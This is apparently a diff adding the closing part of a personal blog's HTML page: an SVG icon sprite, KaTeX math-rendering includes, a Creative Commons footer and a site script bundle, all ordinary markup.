+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 18.001 18.001" id="twitter">
+    <path d="M15.891 4.013c.808-.496 1.343-1.173 1.605-2.034a8.68 8.68 0 0 1-2.351.861c-.703-.756-1.593-1.14-2.66-1.14-1.043 0-1.924.366-2.643 1.078a3.56 3.56 0 0 0-1.076 2.605c0 .309.039.585.117.819-3.076-.105-5.622-1.381-7.628-3.837-.34.601-.51 1.213-.51 1.846 0 1.301.549 2.332 1.645 3.089-.625-.053-1.176-.211-1.645-.47 0 .929.273 1.705.82 2.388a3.623 3.623 0 0 0 2.115 1.291c-.312.08-.641.118-.979.118-.312 0-.533-.026-.664-.083.23.757.664 1.371 1.291 1.841a3.652 3.652 0 0 0 2.152.743C4.148 14.173 2.625 14.69.902 14.69c-.422 0-.721-.006-.902-.038 1.697 1.102 3.586 1.649 5.676 1.649 2.139 0 4.029-.542 5.674-1.626 1.645-1.078 2.859-2.408 3.639-3.974a10.77 10.77 0 0 0 1.172-4.892v-.468a7.788 7.788 0 0 0 1.84-1.921 8.142 8.142 0 0 1-2.11.593z"
+      ></path>
+  </symbol>
+  <symbol aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="mail">
+    <path  d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="calendar">
+    <path d="M452 40h-24V0h-40v40H124V0H84v40H60C26.916 40 0 66.916 0 100v352c0 33.084 26.916 60 60 60h392c33.084 0 60-26.916 60-60V100c0-33.084-26.916-60-60-60zm20 412c0 11.028-8.972 20-20 20H60c-11.028 0-20-8.972-20-20V188h432v264zm0-304H40v-48c0-11.028 8.972-20 20-20h24v40h40V80h264v40h40V80h24c11.028 0 20 8.972 20 20v48z"></path>
+    <path d="M76 230h40v40H76zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zM76 310h40v40H76zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zM76 390h40v40H76zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zm80-80h40v40h-40z"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="github">
+    <path d="M255.968 5.329C114.624 5.329 0 120.401 0 262.353c0 113.536 73.344 209.856 175.104 243.872 12.8 2.368 17.472-5.568 17.472-12.384 0-6.112-.224-22.272-.352-43.712-71.2 15.52-86.24-34.464-86.24-34.464-11.616-29.696-28.416-37.6-28.416-37.6-23.264-15.936 1.728-15.616 1.728-15.616 25.696 1.824 39.2 26.496 39.2 26.496 22.848 39.264 59.936 27.936 74.528 21.344 2.304-16.608 8.928-27.936 16.256-34.368-56.832-6.496-116.608-28.544-116.608-127.008 0-28.064 9.984-51.008 26.368-68.992-2.656-6.496-11.424-32.64 2.496-68 0 0 21.504-6.912 70.4 26.336 20.416-5.696 42.304-8.544 64.096-8.64 21.728.128 43.648 2.944 64.096 8.672 48.864-33.248 70.336-26.336 70.336-26.336 13.952 35.392 5.184 61.504 2.56 68 16.416 17.984 26.304 40.928 26.304 68.992 0 98.72-59.84 120.448-116.864 126.816 9.184 7.936 17.376 23.616 17.376 47.584 0 34.368-.32 62.08-.32 70.496 0 6.88 4.608 14.88 17.6 12.352C438.72 472.145 512 375.857 512 262.353 512 120.401 397.376 5.329 255.968 5.329z"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 212 212" id="gitlab">
+    <path d="M12.3 74.7h54L43.3 3c-1-3.6-6.4-3.6-7.6 0L12.3 74.8z" />
+    <path d="M12.3 74.7L.5 111c-1 3.2 0 6.8 3 8.8l101.6 74-92.5-119z"/>
+    <path d="M105 193.7l-38.6-119h-54l92.7 119z"/>
+    <path d="M105 193.7l38.7-119H66.4l38.7 119z"/>
+    <path d="M105 193.7l38.7-119H198l-93 119z"/>
+    <path d="M198 74.7l11.6 36.2c1 3 0 6.6-3 8.6l-101.5 74 93-119z"/>
+    <path d="M198 74.7h-54.3L167 3c1.2-3.6 6.4-3.6 7.6 0L198 74.8z"/> 
+  </symbol>
+  <symbol viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" id="rss">
+    <circle cx="3.429" cy="20.571" r="3.429"></circle>
+    <path d="M11.429 24h4.57C15.999 15.179 8.821 8.001 0 8v4.572c6.302.001 11.429 5.126 11.429 11.428z"></path>
+    <path d="M24 24C24 10.766 13.234 0 0 0v4.571c10.714 0 19.43 8.714 19.43 19.429z"></path>
+  </symbol>
+  <symbol viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" id="linkedin">
+    <path d="M437 0H75C33.648 0 0 33.648 0 75v362c0 41.352 33.648 75 75 75h362c41.352 0 75-33.648 75-75V75c0-41.352-33.648-75-75-75zM181 406h-60V196h60zm0-240h-60v-60h60zm210 240h-60V286c0-16.54-13.46-30-30-30s-30 13.46-30 30v120h-60V196h60v11.309C286.719 202.422 296.93 196 316 196c40.691.043 75 36.547 75 79.688zm0 0"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 612 612" id="arrow">
+    <path d="M604.501 440.509L325.398 134.956c-5.331-5.357-12.423-7.627-19.386-7.27-6.989-.357-14.056 1.913-19.387 7.27L7.499 440.509c-9.999 10.024-9.999 26.298 0 36.323s26.223 10.024 36.222 0l262.293-287.164L568.28 476.832c9.999 10.024 26.222 10.024 36.221 0 9.999-10.023 9.999-26.298 0-36.323z"></path>
+  </symbol>
+  <symbol viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" id="carly">
+    <path d="M504.971 239.029L448 182.059V84c0-46.317-37.682-84-84-84h-44c-13.255 0-24 10.745-24 24s10.745 24 24 24h44c19.851 0 36 16.149 36 36v108c0 6.365 2.529 12.47 7.029 16.971L454.059 256l-47.029 47.029A24.002 24.002 0 0 0 400 320v108c0 19.851-16.149 36-36 36h-44c-13.255 0-24 10.745-24 24s10.745 24 24 24h44c46.318 0 84-37.683 84-84v-98.059l56.971-56.971c9.372-9.372 9.372-24.568 0-33.941zM112 192V84c0-19.851 16.149-36 36-36h44c13.255 0 24-10.745 24-24S205.255 0 192 0h-44c-46.318 0-84 37.683-84 84v98.059l-56.971 56.97c-9.373 9.373-9.373 24.568 0 33.941L64 329.941V428c0 46.317 37.682 84 84 84h44c13.255 0 24-10.745 24-24s-10.745-24-24-24h-44c-19.851 0-36-16.149-36-36V320c0-6.365-2.529-12.47-7.029-16.971L57.941 256l47.029-47.029A24.002 24.002 0 0 0 112 192z"></path>
+  </symbol>
+  <symbol viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" id="copy">
+    <path d="M23 2.75A2.75 2.75 0 0 0 20.25 0H8.75A2.75 2.75 0 0 0 6 2.75v13.5A2.75 2.75 0 0 0 8.75 19h11.5A2.75 2.75 0 0 0 23 16.25zM18.25 14.5h-7.5a.75.75 0 0 1 0-1.5h7.5a.75.75 0 0 1 0 1.5zm0-3h-7.5a.75.75 0 0 1 0-1.5h7.5a.75.75 0 0 1 0 1.5zm0-3h-7.5a.75.75 0 0 1 0-1.5h7.5a.75.75 0 0 1 0 1.5z"></path>
+    <path d="M8.75 20.5a4.255 4.255 0 0 1-4.25-4.25V2.75c0-.086.02-.166.025-.25H3.75A2.752 2.752 0 0 0 1 5.25v16A2.752 2.752 0 0 0 3.75 24h12a2.752 2.752 0 0 0 2.75-2.75v-.75z"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512.001 512.001" id="closeme">
+    <path d="M284.286 256.002L506.143 34.144c7.811-7.811 7.811-20.475 0-28.285-7.811-7.81-20.475-7.811-28.285 0L256 227.717 34.143 5.859c-7.811-7.811-20.475-7.811-28.285 0-7.81 7.811-7.811 20.475 0 28.285l221.857 221.857L5.858 477.859c-7.811 7.811-7.811 20.475 0 28.285a19.938 19.938 0 0 0 14.143 5.857 19.94 19.94 0 0 0 14.143-5.857L256 284.287l221.857 221.857c3.905 3.905 9.024 5.857 14.143 5.857s10.237-1.952 14.143-5.857c7.811-7.811 7.811-20.475 0-28.285L284.286 256.002z"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="open-menu">
+    <path d="M492 236H20c-11.046 0-20 8.954-20 20s8.954 20 20 20h472c11.046 0 20-8.954 20-20s-8.954-20-20-20zm0-160H20C8.954 76 0 84.954 0 96s8.954 20 20 20h472c11.046 0 20-8.954 20-20s-8.954-20-20-20zm0 320H20c-11.046 0-20 8.954-20 20s8.954 20 20 20h472c11.046 0 20-8.954 20-20s-8.954-20-20-20z"></path>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" id="instagram">
+    <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" id=youtube>
+    <path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"/>
+  </symbol>
+  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" id="stackoverflow">
+    <path d="M21 27v-8h3v11H0V19h3v8h18z"></path><path d="M17.1.2L15 1.8l7.9 10.6 2.1-1.6L17.1.2zm3.7 14.7L10.6 6.4l1.7-2 10.2 8.5-1.7 2zM7.2 12.3l12 5.6 1.1-2.4-12-5.6-1.1 2.4zm-1.8 6.8l13.56 1.96.17-2.38-13.26-2.55-.47 2.97zM19 25H5v-3h14v3z"></path>
+  </symbol>
+</svg>
+
+
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js" integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<footer class="footer">
+  <div class="footer_inner wrap pale">
+    <img src='https://tqts.ar/logos/footer.png' class="icon icon_2 transparent" alt="tqts.ar">
+    <p><span class="year"></span> - &nbsp;Written by tqts. All content under Creative Commons  <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">by-nc-sa</a></p><a class="to_top" href="#documentTop">
+  <svg class="icon">
+  <use xlink:href="#arrow"></use>
+</svg>
+</a>
+
+  </div>
+</footer>
+
+    <script type="text/javascript" src="https://tqts.ar/js/bundle.min.061d04727b51b0a8fafe2f15b9370a961f33306e7af52abd00d69c906f5d825f1599306159d7756d7d2b4f359767a170625ae541d1f37d05c1daa4d5c7feec25.js" integrity="sha512-Bh0EcntRsKj6/i8VuTcKlh8zMG569Sq9ANackG9dgl8VmTBhWdd1bX0rTzWXZ6FwYlrlQdHzfQXB2qTVx/7sJQ==" crossorigin="anonymous"></script>
+    
+  </body>
+</html>
